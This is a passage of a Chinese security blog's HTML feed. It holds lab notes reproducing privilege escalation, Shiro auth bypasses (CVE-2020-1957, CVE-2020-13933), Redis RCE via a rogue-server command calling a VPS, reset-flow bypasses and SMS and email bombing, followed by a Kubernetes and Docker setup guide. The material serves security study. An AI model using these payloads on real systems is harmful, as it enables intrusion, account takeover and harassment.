class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="漏洞案例"><a href="#漏洞案例" class="headerlink" title="漏洞案例"></a>漏洞案例</h3><h4 id="Pikachu-Over-Permission"><a href="#Pikachu-Over-Permission" class="headerlink" title="Pikachu-Over Permission"></a>Pikachu-Over Permission</h4><p><strong>水平越权：</strong></p><ol><li>登录lili账号，查看基本信息，抓包</li></ol><p><img src="/2023/012220963/181.PNG" alt=" "></p><ol start="2"><li>修改get传参的username中的参数(标识)，可以实现水平越权</li></ol><p><img src="/2023/012220963/182.PNG" alt=" "></p><p><strong>垂直越权：</strong></p><p><img src="/2023/012220963/183.PNG" alt=" "></p><p>使用普通用户的身份标识进行垂直越权时，身份标识要保持一直有效，同时抓包的数据包是被越权用户。</p><p><strong>获取垂直越权数据包：</strong></p><ol><li><p>猜测接口</p></li><li><p>通过前端的操作功能去抓包</p></li><li><p>代码审计（CMS、源码泄露）</p></li></ol><h4 id="CVE-2020-1957"><a href="#CVE-2020-1957" class="headerlink" title="CVE-2020-1957"></a>CVE-2020-1957</h4><p><strong>Shiro权限绕过（CVE-2020-1957）</strong></p><p>影响范围： <strong>Shiro 1.4.2 -&gt; 1.5.0版本</strong></p><p>Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。</p><p><strong>漏洞复现：</strong></p><p>环境：shiro 权限绕过（CVE-2020-1957）</p><p><img src="/2023/012220963/184.PNG" alt=" "></p><p>访问：/hello/123</p><p>提示需要登录</p><p>在末尾加个/再访问：/hello/123/</p><p>进入页面</p><p><strong>原理分析：</strong></p><p><a href="https://blog.csdn.net/qq_22807425/article/details/108283839">https://blog.csdn.net/qq_22807425/article/details/108283839</a></p><p>Shiro使用正则进行路由匹配和拦截， /hello/* 下的路径全部需要进行认证</p><p><img src="/2023/012220963/185.PNG" alt=" "></p><p>如果我们访问 /hello/1 接口，会被authc拦截器拦截</p><p>但是我们访问 /hello/1/ 接口则不会被拦截</p><p><strong>漏洞修复：</strong>后续版本增加了/结尾的判断，通过判断requestURI是否以/为结尾，如果以/结尾的话，则去</p><p>掉尾部的/符号在与URL表达式进行比较。</p><h4 id="CNVD-2019-21763"><a href="#CNVD-2019-21763" class="headerlink" title="CNVD-2019-21763"></a>CNVD-2019-21763</h4><p><strong>Redis 未授权访问（CNVD-2019-21763）</strong></p><p>影响范围： <strong>Redis 2.x，3.x，4.x，5.x</strong></p><p>漏洞复现：</p><p>环境：vulfocus/redis-cnvd_2019_21763:latest</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">docker pull vulfocus/redis-cnvd_2019_21763:latestdocker run -d -p <span class="token number">63790</span>:6379 vulfocus/redis-cnvd_2019_21763:latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>开启环境之后，在本机的63790端口映射出一个Redis服务</p><p>复现需要两个EXP</p><p><a href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a></p><p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p><p>将redis-rogue-server中的exp.so复制到redis-rce中</p><p>执行exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python3 redis<span class="token operator">-</span>rce<span class="token punctuation">.</span>py <span class="token operator">-</span>r 目标地址 <span class="token operator">-</span>p 目标端口 <span class="token operator">-</span>L vps地址 <span class="token operator">-</span>P vps端口 <span class="token operator">-</span>f exp<span class="token punctuation">.</span>so<span class="token comment"># eg:</span>python3 redis<span class="token operator">-</span>rce<span class="token punctuation">.</span>py <span class="token operator">-</span>r <span class="token number">193.168</span><span class="token number">.4</span><span class="token number">.75</span> <span class="token operator">-</span>p <span class="token number">63790</span> <span class="token operator">-</span>L <span class="token number">193.168</span><span class="token number">.4</span><span class="token number">.75</span> <span class="token operator">-</span>P <span class="token number">12345</span> <span class="token operator">-</span>f exp<span class="token punctuation">.</span>so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2023/012220963/186.PNG" alt=" "></p><h4 id="CVE-2020-13933"><a href="#CVE-2020-13933" class="headerlink" title="CVE-2020-13933"></a>CVE-2020-13933</h4><p><strong>Shiro身份验证绕过 （CVE-2020-13933）</strong></p><p>影响范围： <strong>Shiro &lt; 1.6.0</strong> <strong>版本</strong></p><p>漏洞复现：</p><p>环境：Shiro 身份验证绕过 （CVE-2020-13933）</p><p><img src="/2023/012220963/187.PNG" alt=" "></p><p><img src="/2023/012220963/188.PNG" alt=" "></p><p>访问身份验证页面</p><p><a href="http://ip:port/login">http://ip:port/login</a></p><p>通过特殊payload绕过权限</p><p><a href="http://ip:port/admin/%3bxxx">http://ip:port/admin/%3bxxx</a></p><p><strong>原理分析：</strong></p><p>Shiro源码</p><p>url：<a href="http://ip:port/read/%3bxxxx">http://ip:port/read/%3bxxxx</a></p><p>Shiro接收URL参数为：/read/;xxxx，这里shiro是对%3b做了解码处理</p><p><img src="/2023/012220963/189.PNG" alt=" "></p><p>接着调用removeSemicolon，该方法查找; 并将;及其之后的部分删除，最后再调用normalize</p><p><img src="/2023/012220963/191.PNG" alt=" "></p><p><img src="/2023/012220963/190.PNG" alt=" "></p><p>接着获取filterChains所对应的filter，将处理后的url进行匹配</p><p>匹配到xxxx后返回xxxx的页面</p><p><a href="https://blog.csdn.net/weixin_45728976/article/details/108737882">https://blog.csdn.net/weixin_45728976/article/details/108737882</a></p><h4 id="身份认证漏洞实战"><a href="#身份认证漏洞实战" class="headerlink" title="身份认证漏洞实战"></a>身份认证漏洞实战</h4><p>环境：<a href="https://www.mozhe.cn/bug/detail/eUM3SktudHdrUVh6eFloU0VERzB4Zz09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/eUM3SktudHdrUVh6eFloU0VERzB4Zz09bW96aGUmozhe</a></p><p><strong>漏洞复现：</strong></p><ol><li>登录平台</li></ol><p><img src="/2023/012220963/192.PNG" alt=" "></p><ol start="2"><li>抓取数据包</li></ol><p>第一个包：</p><p><img src="/2023/012220963/193.PNG" alt=" "></p><p>之后点击forword放掉，截取第二个包</p><p><img src="/2023/012220963/194.PNG" alt=" "></p><ol start="3"><li>进行暴力破解</li></ol><p><img src="/2023/012220963/195.PNG" alt=" "></p><p><img src="/2023/012220963/196.PNG" alt=" "></p><ol start="4"><li>回到登录界面，查看源代码，查找马春生的身份标识</li></ol><p><img src="/2023/012220963/197.PNG" alt=" "></p><ol start="5"><li>去爆破结果中找到相应信息</li></ol><p><img src="/2023/012220963/198.PNG" alt=" "></p><ol start="6"><li>对密码解md5</li></ol><p><img src="/2023/012220963/199.PNG" alt=" "></p><ol start="8"><li>登录</li></ol><p><img src="/2023/012220963/200.PNG" alt=" "></p><p>success!!!</p><h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>前端验证：传输加密</p><p>后端验证：永远不要相信用户的输入</p><h2 id="逻辑漏洞-找回漏洞及接口安全"><a href="#逻辑漏洞-找回漏洞及接口安全" class="headerlink" title="逻辑漏洞-找回漏洞及接口安全"></a>逻辑漏洞-找回漏洞及接口安全</h2><h3 id="找回漏洞"><a href="#找回漏洞" class="headerlink" title="找回漏洞"></a>找回漏洞</h3><h4 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h4><p><strong>找回密码机制：</strong></p><p>用户提交找回请求 -&gt; 服务器发送一个验证码 -&gt; 用户输入验证码 -&gt; 验证 -&gt; 重置信息</p><p><strong>绕过验证：</strong></p><ul><li><p>修改验证的状态码</p></li><li><p>验证码爆破（验证码长度较小、有效时间较长）</p></li><li><p>找回流程绕过（直接跳转到重置密码的页面）</p></li></ul><h4 id="找回流程绕过-验证码套用"><a href="#找回流程绕过-验证码套用" class="headerlink" title="找回流程绕过 验证码套用"></a>找回流程绕过 验证码套用</h4><p>环境：<a href="https://www.mozhe.cn/bug/detail/K2sxTTVYaWNncUE1cTdyNXIyTklHdz09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/K2sxTTVYaWNncUE1cTdyNXIyTklHdz09bW96aGUmozhe</a></p><p>输入正确的手机号接收验证码后，将表单中的手机号改成被重置密码的手机号再点击提交，即可实现验</p><p>证码绕过。</p><p><img src="/2023/012220963/202.PNG" alt=" "></p><p><img src="/2023/012220963/201.PNG" alt=" "></p><h5 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h5><p>正常的找回密码逻辑：</p><ol><li><p> 第一个页面输入手机号获取验证码</p></li><li><p>验证成功后，在第二个页面重置密码</p></li></ol><p>例：<a href="https://accounts.qq.com/find/password">https://accounts.qq.com/find/password</a></p><p>此环境的的逻辑：</p><p>接收验证码和重置密码在同一个页面中，导致逻辑被绕过</p><h4 id="验证码客户端回显"><a href="#验证码客户端回显" class="headerlink" title="验证码客户端回显"></a>验证码客户端回显</h4><p>一些网站为了开发方便，会在需要验证时，在客户端随机生成一个验证码，然后让服务端直接发送此随</p><p>机的验证码。</p><p>优点：验证时无需通过服务器，开发省事</p><p>缺点：黑客入侵也方便</p><h4 id="修改状态码绕过验证"><a href="#修改状态码绕过验证" class="headerlink" title="修改状态码绕过验证"></a>修改状态码绕过验证</h4><h5 id="抓Android数据包"><a href="#抓Android数据包" class="headerlink" title="抓Android数据包"></a>抓Android数据包</h5><ol><li>在电脑中安装 逍遥模拟器</li><li>在Burpsuit中添加代理地址</li></ol><p><img src="/2023/012220963/203.PNG" alt=" "></p><ol start="3"><li>在模拟器中，找到网络设置，在wifi中手动配置代理</li></ol><p><img src="/2023/012220963/204.PNG" alt=" "></p><h5 id="修改验证状态码"><a href="#修改验证状态码" class="headerlink" title="修改验证状态码"></a>修改验证状态码</h5><p>一些客户端在校验验证码时，是以服务端发送的响应包中的状态码为准。</p><p>我们可以通过将错误的状态码修改成正确的状态码，来骗过客户端，从而达到绕过验证。</p><p><strong>案例演示：真实APP修改状态码绕过验证</strong></p><p><img src="/2023/012220963/205.PNG" alt=" "></p><h4 id="验证码爆破"><a href="#验证码爆破" class="headerlink" title="验证码爆破"></a>验证码爆破</h4><p>条件：</p><ul><li>验证码位数短</li><li>不同时包括数组和字母</li><li>验证码有效期长</li><li>没有输入错误的限制</li><li>无图片验证码</li></ul><h3 id="接口安全"><a href="#接口安全" class="headerlink" title="接口安全"></a>接口安全</h3><h4 id="邮件接口安全"><a href="#邮件接口安全" class="headerlink" title="邮件接口安全"></a>邮件接口安全</h4><p>原理：客户端调用需要发送验证码的接口是，接口没有做相关的验证</p><p>如： <a href="http://example.com/getcode?email=13112345678@163.com">http://example.com/getcode?email=13112345678@163.com</a></p><p>更换接口中的邮件可实现向任意邮件发送验证码</p><p>配合自动化脚本，即可实现简易的 邮件轰炸</p><p><strong>了解原理即可，如需测试请使用自己的邮箱，注意点到为止！！</strong></p><p><strong>切勿用于邮件轰炸！！</strong></p><p><img src="/2023/012220963/206.PNG" alt=" "></p><p>修改邮箱和时间戳</p><p><img src="/2023/012220963/207.PNG" alt=" "></p><h4 id="短信接口安全"><a href="#短信接口安全" class="headerlink" title="短信接口安全"></a>短信接口安全</h4><p>原理：客户端调用需要发送验证码的接口是，接口没有做相关的验证</p><p>如： <a href="http://example.com/getcode?phone=13112345678">http://example.com/getcode?phone=13112345678</a></p><p>更换接口中的手机号可实现向任意手机发送短信验证码</p><p>配合自动化脚本，即可实现简易的 短信轰炸</p><p><strong>了解原理即可，如需测试请使用自己的手机号，注意点到为止！！</strong></p><p><strong>切勿用于短信轰炸！！</strong></p><h4 id="语音接口安全"><a href="#语音接口安全" class="headerlink" title="语音接口安全"></a>语音接口安全</h4>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>云原生网路全景安全数据采集与智能分析</title>
      <link href="/2022/10208472.html"/>
      <url>/2022/10208472.html</url>
      
        <content type="html"><![CDATA[<h2 id="k8s集群环境搭建"><a href="#k8s集群环境搭建" class="headerlink" title="k8s集群环境搭建"></a>k8s集群环境搭建</h2><h3 id="一、Kubernetes概述"><a href="#一、Kubernetes概述" class="headerlink" title="一、Kubernetes概述"></a>一、Kubernetes概述</h3><h4 id="1-什么是k8s"><a href="#1-什么是k8s" class="headerlink" title="1.什么是k8s"></a>1.什么是k8s</h4><p>Kubernetes（K8s）是Google在2014年发布的一个开源项目。</p><p>​    据说Google的数据中心里运行着20多亿个容器，而且Google十年多前就开始使用容器技术。</p><p>​    最初，Google开发了一个叫Borg的系统（现在命名为Omega）来调度如此庞大数量的容器和工作负载。在积累了这么多年的经验后，Google决定重写这个容器管理系统，并将其贡献到开源社区，让全世界都能受益。</p><p>​    这个项目就是Kubernetes。简单地讲，Kubernetes是Google Omega的开源版本。</p><p>​    从2014年第一个版本发布以来，Kubernetes迅速获得开源社区的追捧，包括Red Hat、VMware、Canonical在内的很多有影响力的公司加入到开发和推广的阵营。目前Kubernetes已经成为发展最快、市场占有率最高的容器编排引擎产品。</p><p><img src="/2022/10208472/k8s2.png" alt=" "></p><p><img src="/2022/10208472/k8s3.png" alt=" "></p><h4 id="2-kubernetes解决了什么问题"><a href="#2-kubernetes解决了什么问题" class="headerlink" title="2.kubernetes解决了什么问题"></a>2.kubernetes解决了什么问题</h4><ul><li>通过 Kubernetes，分布式系统工具将拥有网络效应。每当人们为 Kubernetes 制作出的新的工具，都会让所有其他工具更完善。因此，这进一步巩固了 Kubernetes 的标准地位。</li><li>云提供商并非可替换的商品。不同的云提供的服务会变得越来越独特和不同。如果可以访问不同的云提供商提供的不同服务，那么企业将因此受益。</li><li>当多节点应用与单节点应用一样可靠时，我们将看到定价模型的变化。</li><li>这就是为什么我会被 Kubernetes 洗脑的原因，它是跨越异构系统的一个标准层。</li><li>将来，我们会像讨论编译器和操作系统内核一样讨论 Kubernetes。 Kubernetes 将会是低层级的管路系统，而不在普通应用开发人员的视野之内。</li></ul><p>Kubernetes 已成为部署分布式应用的标准方式。在不远的将来，任何新成立的互联网公司都将用到 Kubernetes，无论其是否意识到这点。许多旧应用也正在迁移到 Kubernetes。</p><h5 id="2-1-起因：Docker"><a href="#2-1-起因：Docker" class="headerlink" title="2.1 起因：Docker"></a>2.1 起因：Docker</h5><p><img src="/2022/10208472/k8s5.png" alt=" "></p><h5 id="单一稳定的一体化模型"><a href="#单一稳定的一体化模型" class="headerlink" title="单一稳定的一体化模型"></a>单一稳定的一体化模型</h5><p><img src="/2022/10208472/k8s6.png" alt=" "></p><h5 id="微型化的应用部署模型"><a href="#微型化的应用部署模型" class="headerlink" title="微型化的应用部署模型"></a>微型化的应用部署模型</h5><p>(微服务、分布式、集群、高可用、负载均衡…)</p><p><img src="/2022/10208472/k8s7.png" alt=" "></p><h5 id="2-2-容器编排？是需要标准的？"><a href="#2-2-容器编排？是需要标准的？" class="headerlink" title="2.2 容器编排？是需要标准的？"></a>2.2 容器编排？是需要标准的？</h5><p>如此多的docker该如何管理(通信、负载均衡、资源共享管理、容灾、监控、健康检查….)？</p><ul><li>Mesos</li></ul><p><img src="/2022/10208472/k8s8.png" alt=" "></p><ul><li>docker swarm</li></ul><p><img src="/2022/10208472/k8s9.png" alt=" "></p><ul><li>kubernetes</li></ul><p><img src="/2022/10208472/k8s10.png" alt=" "></p><p>自2016年中，k8s表现出明显优势。</p><p><img src="/2022/10208472/k8s11.png" alt=" "></p><h3 id="二、环境"><a href="#二、环境" class="headerlink" title="二、环境"></a>二、环境</h3><h3 id="2-1-部署软件环境版本"><a href="#2-1-部署软件环境版本" class="headerlink" title="2.1 部署软件环境版本"></a>2.1 部署软件环境版本</h3><p>操作系统: <code>Ubuntu 18.04</code>（自行下载安装即可，我们采用在VMware中安装，语言最好选择英文，在对虚拟机命名时最好直接命名为master、node1,…）</p><p>Docker： <code>docker-ce 18.06</code></p><p>Kubernetes: <code>k8s 1.13.1</code></p><h3 id="2-2-修改root密码并设置开机root自动登录"><a href="#2-2-修改root密码并设置开机root自动登录" class="headerlink" title="2.2 修改root密码并设置开机root自动登录"></a>2.2 修改root密码并设置开机root自动登录</h3><h4 id="2-2-1-为root设置密码"><a href="#2-2-1-为root设置密码" class="headerlink" title="2.2.1 为root设置密码"></a>2.2.1 为root设置密码</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">passwd</span> root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-2-2-修改50-ubuntu-conf配置文件内容"><a href="#2-2-2-修改50-ubuntu-conf配置文件内容" class="headerlink" title="2.2.2 修改50-ubuntu.conf配置文件内容"></a>2.2.2 修改50-ubuntu.conf配置文件内容</h4><p>​        文件位置/usr/share/lightdm/lightdm.conf.d/50-ubuntu.conf（如果没有此文件，就到这个目录找类似文件）</p><ol><li>找到文件后使用终端修改文件权限（默认为只读）</li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span>  <span class="token function">chmod</span>  <span class="token number">777</span>  /usr/share/lightdm/lightdm.conf.d/50-ubuntu.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>打开文件，修改配置文件内容(个人推荐使用gedit命令)</li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">gedit  /usr/share/lightdm/lightdm.conf.d/50-ubuntu.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在文件末尾加入两行代码</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">greeter-show-manual-login<span class="token operator">=</span>trueall-guest<span class="token operator">=</span>false<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>此配置文件就设置完成了。</p><h4 id="2-2-3-修改gdm-autologin和gdm-passwd文件"><a href="#2-2-3-修改gdm-autologin和gdm-passwd文件" class="headerlink" title="2.2.3 修改gdm-autologin和gdm-passwd文件"></a>2.2.3 修改gdm-autologin和gdm-passwd文件</h4><p>​        进入/etc/pam.d文件夹下，找到gdm-autologin和gdm-passwd文件（没有的话找类似文件）</p><p>​        找到文件后参照之前的操作给予文件权限</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span>  <span class="token function">chmod</span>  <span class="token number">777</span> /etc/pam.d/gdm-autologin<span class="token function">sudo</span>  <span class="token function">chmod</span>  <span class="token number">777</span> /etc/pam.d/gdm-password<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>​        两个文件都注释掉auth required pam_success_if.so user!=root quiet_success这一行(我的是正着数第三行)</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">gedit /etc/pam.d/gdm-autologingedit /etc/pam.d/gdm-password <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>修改完这两个文件就可以进行下一步了。</p><h4 id="2-2-3-修改-root-profile文件"><a href="#2-2-3-修改-root-profile文件" class="headerlink" title="2.2.3 修改/root/.profile文件"></a>2.2.3 修改/root/.profile文件</h4><p>​        找到要修改的.profile文件，此文件为隐藏文件，建议直接命令行查找</p><p>​        开启root权限，打开文件，注释掉最后一行，然后加上<br>​        tty -s&amp;&amp;mesg n || true</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">gedit /root/.profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/10208472/1.png" alt=" "></p><p>至此root用户登录权限设置完成，重新启动后选择其他用户(这个在左下角)输入用户名：root，以及root密码即可登录。（仍需手动输入用户名和密码）</p><h4 id="2-2-4-修改custom-conf文件"><a href="#2-2-4-修改custom-conf文件" class="headerlink" title="2.2.4 修改custom.conf文件"></a>2.2.4 修改custom.conf文件</h4><p>文件夹路径为/etc/gdm3/（没有的话找类似文件夹，例如：/gdm）</p><p>ps：没有这个文件的话把设置里的用户登录的自动登录选项打开。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">gedit custom.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改文件</p><p><img src="/2022/10208472/2.png" alt=" "></p><h3 id="三、Docker-CE安装及配置（我们全程在root下）"><a href="#三、Docker-CE安装及配置（我们全程在root下）" class="headerlink" title="三、Docker-CE安装及配置（我们全程在root下）"></a>三、Docker-CE安装及配置（我们全程在root下）</h3><h4 id="3-1-给虚拟机切换阿里源-清华源都行"><a href="#3-1-给虚拟机切换阿里源-清华源都行" class="headerlink" title="3.1 给虚拟机切换阿里源(清华源都行)"></a>3.1 给虚拟机切换阿里源(清华源都行)</h4><h5 id="3-1-1-备份原来的系统默认源"><a href="#3-1-1-备份原来的系统默认源" class="headerlink" title="3.1.1 备份原来的系统默认源"></a>3.1.1 备份原来的系统默认源</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">cp</span> /etc/apt/sources.list /etc/apt/sources_init.list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="3-1-2-更换源"><a href="#3-1-2-更换源" class="headerlink" title="3.1.2 更换源"></a>3.1.2 更换源</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> gedit /etc/apt/sources.list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用gedit文本编辑器，将下边的阿里源复制进去(粘贴之前里面东西可清空)，然后点击保存关闭。</p><pre class="line-numbers language-none"><code class="language-none">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic main restricted universe multiversedeb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic main restricted universe multiversedeb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiversedeb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiversedeb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiversedeb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiversedeb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-proposed main restricted universe multiversedeb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-proposed main restricted universe multiversedeb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiversedeb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiverse<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="3-1-3-更新源"><a href="#3-1-3-更新源" class="headerlink" title="3.1.3 更新源"></a>3.1.3 更新源</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">apt-get</span> update<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-2-1-基础准备"><a href="#3-2-1-基础准备" class="headerlink" title="3.2.1 基础准备"></a>3.2.1 基础准备</h4><ol><li>Docker 要求 Ubuntu 系统的内核版本高于 3.10 ，查看本页面的前提条件来验证你的 Ubuntu 版本是否支持 Docker。</li></ol>  <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">uname</span> -r <span class="token punctuation">(</span>主版本必须保持一致<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>   2.安装<code>curl </code></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">apt-get</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">apt-get</span> <span class="token function">install</span> -y <span class="token function">curl</span> telnet <span class="token function">wget</span> <span class="token function">man</span> <span class="token punctuation">\</span>apt-transport-https <span class="token punctuation">\</span>ca-certificates <span class="token punctuation">\</span>software-properties-common <span class="token function">vim</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-2-2-在线安装Docker-ce-本教程不推荐"><a href="#3-2-2-在线安装Docker-ce-本教程不推荐" class="headerlink" title="3.2.2 在线安装Docker-ce(本教程不推荐)"></a>3.2.2 在线安装Docker-ce(本教程不推荐)</h4><p>(建议下面的手动安装方式，因为在线可能会出现版本不一致)</p><p>注意： <strong>该国内源目前提供 <code>18.09</code>版本，与k8s不符。k8s推荐安装<code>Docker ce 18.06</code></strong></p><ol><li>安装GPG秘钥和添加国内镜像</li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">curl</span> -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg <span class="token operator">|</span> <span class="token function">sudo</span> apt-key <span class="token function">add</span> -<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加国内源头</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ add-apt-repository <span class="token punctuation">\</span>    <span class="token string">"deb https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu \    <span class="token variable"><span class="token variable">$(</span>lsb_release -cs<span class="token variable">)</span></span> \    stable"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>更新国内源路径</li></ol><pre class="line-numbers language-none"><code class="language-none">apt update<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>安装查看版本指令</li></ol><pre class="line-numbers language-none"><code class="language-none">apt-get install -y apt-show-versions<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>查看docker-ce版本号</li></ol><pre class="line-numbers language-none"><code class="language-none">apt-show-versions -a docker-ce<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>在线安装<code>Docker-ce</code></li></ol><pre class="line-numbers language-none"><code class="language-none">sudo apt-get update &amp;&amp; apt-get install -y docker-ce<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意查看当前安装的真实版本</p><h5 id="3-2-3-手动安装Docker-离线安装"><a href="#3-2-3-手动安装Docker-离线安装" class="headerlink" title="3.2.3 手动安装Docker(离线安装)"></a>3.2.3 手动安装Docker(离线安装)</h5><ol><li>下载<code>docker-ce_18.06.1\~ce\~3-0\~ubuntu_amd64.deb</code></li><li>上传到上述文件到待安装服务器<code>master</code></li><li>登录待安装服务器，切换到root账户</li><li><code>dpkg -i docker-ce_18.06.1\~ce\~3-0\~ubuntu_amd64.deb</code></li></ol><blockquote><p>如果提示错误</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dpkg: error: dpkg frontend is locked by another process<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>说明已经有其他进程在使用dpkg安装程序</p><pre class="line-numbers language-none"><code class="language-none">sudo rm &#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;lock<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可。</p><p>如果提示错误</p><pre class="line-numbers language-none"><code class="language-none">itcast@master:~&#x2F;package$ sudo dpkg -i docker-ce_18.06.1~ce~3-0~ubuntu_amd64.deb [sudo] password for itcast: Selecting previously unselected package docker-ce.(Reading database ... 100647 files and directories currently installed.)Preparing to unpack docker-ce_18.06.1~ce~3-0~ubuntu_amd64.deb ...Unpacking docker-ce (18.06.1~ce~3-0~ubuntu) ...dpkg: dependency problems prevent configuration of docker-ce: docker-ce depends on libltdl7 (&gt;&#x3D; 2.4.6); however:  Package libltdl7 is not installed.dpkg: error processing package docker-ce (--install): dependency problems - leaving unconfiguredProcessing triggers for man-db (2.8.4-2) ...Processing triggers for systemd (239-7ubuntu10) ...Errors were encountered while processing: docker-ce<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>表示当前docker-ce 依赖系统libltd17库，安装就可以了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">apt-get</span> <span class="token function">install</span> -y libltdl7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>docker version </li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">Client: Version:           <span class="token number">18.06</span>.1-ce API version:       <span class="token number">1.38</span> Go version:        go1.10.3 Git commit:        e68fc7a Built:             Tue Aug <span class="token number">21</span> <span class="token number">17</span>:24:56 <span class="token number">2018</span> OS/Arch:           linux/amd64 Experimental:      <span class="token boolean">false</span>Server: Engine:  Version:          <span class="token number">18.06</span>.1-ce  API version:      <span class="token number">1.38</span> <span class="token punctuation">(</span>minimum version <span class="token number">1.12</span><span class="token punctuation">)</span>  Go version:       go1.10.3  Git commit:       e68fc7a  Built:            Tue Aug <span class="token number">21</span> <span class="token number">17</span>:23:21 <span class="token number">2018</span>  OS/Arch:          linux/amd64  Experimental:     <span class="token boolean">false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>确保版本号是 <code>18.06</code></p><h5 id="3-3-启动Docker-ce"><a href="#3-3-启动Docker-ce" class="headerlink" title="3.3 启动Docker-ce"></a>3.3 启动Docker-ce</h5><ol><li>开机并启动docker</li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> systemctl <span class="token builtin class-name">enable</span> docker <span class="token function">sudo</span> systemctl start docker <span aria-hidden="true" 